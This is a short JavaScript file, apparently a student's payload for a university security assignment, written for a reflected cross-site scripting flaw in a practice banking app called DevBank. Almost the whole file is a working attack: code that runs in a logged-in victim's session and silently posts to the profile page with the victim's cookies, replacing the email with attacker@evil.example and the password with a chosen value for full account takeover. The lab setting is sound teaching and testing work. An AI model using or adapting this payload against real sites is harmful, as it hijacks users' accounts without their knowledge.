// FIT5003 Assignment 2 - Part B.2 reflected XSS payload
// Hosted on the attacker's own remote resource (GitHub Pages / jsDelivr) and
// pulled in through the reflected XSS sink at /search?q=...
//
// It runs in the logged-in victim's session on the DevBank origin, so the
// request below is same-origin and the victim's auth cookie is sent
// automatically. It silently changes the victim's email and password to
// values the attacker controls -> full account takeover.
(function () {
  fetch("/profile", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    credentials: "include",
    body: "email=attacker@evil.example&password=pwned-by-xss"
  });
})();
